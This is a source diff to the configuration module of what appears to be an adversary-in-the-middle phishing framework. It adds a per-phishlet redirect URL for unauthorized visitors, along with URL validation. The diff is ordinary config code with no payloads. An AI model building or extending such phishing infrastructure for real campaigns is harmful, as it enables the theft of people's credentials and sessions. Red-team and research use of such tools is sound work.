@@ -2,6 +2,7 @@ package core
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -34,9 +35,10 @@ type SubPhishlet struct {
 }
 
 type PhishletConfig struct {
-	Hostname string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
-	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
-	Visible  bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
+	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
+	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
 }
 
 type ProxyConfig struct {
@@ -167,9 +169,10 @@ func (c *Config) PhishletConfig(site string) *PhishletConfig {
 		return o
 	} else {
 		o := &PhishletConfig{
-			Hostname: "",
-			Enabled:  false,
-			Visible:  true,
+			Hostname:  "",
+			UnauthUrl: "",
+			Enabled:   false,
+			Visible:   true,
 		}
 		c.phishletConfig[site] = o
 		return o
@@ -201,6 +204,29 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 	}
 	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
 	c.PhishletConfig(site).Hostname = hostname
+	c.SavePhishlets()
+	return true
+}
+
+func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		log.Error("%v", err)
+		return false
+	}
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set unauth_url")
+		return false
+	}
+	if _url != "" {
+		_, err := url.ParseRequestURI(_url)
+		if err != nil {
+			log.Error("invalid URL: %s", err)
+			return false
+		}
+	}
+	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
+	c.PhishletConfig(site).UnauthUrl = _url
 	c.SavePhishlets()
 	return true
 }
@@ -397,10 +423,15 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
-func (c *Config) SetUnauthUrl(url string) {
-	c.general.UnauthUrl = url
+func (c *Config) SetUnauthUrl(_url string) {
+	_, err := url.ParseRequestURI(_url)
+	if err != nil {
+		log.Error("invalid URL: %s", err)
+		return
+	}
+	c.general.UnauthUrl = _url
 	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("unauthorized request redirection URL set to: %s", url)
+	log.Info("unauthorized request redirection URL set to: %s", _url)
 	c.cfg.WriteConfig()
 }
 
@@ -669,6 +700,13 @@ func (c *Config) GetPhishletNames() []string {
 func (c *Config) GetSiteDomain(site string) (string, bool) {
 	if o, ok := c.phishletConfig[site]; ok {
 		return o.Hostname, ok
+	}
+	return "", false
+}
+
+func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
+	if o, ok := c.phishletConfig[site]; ok {
+		return o.UnauthUrl, ok
 	}
 	return "", false
 }
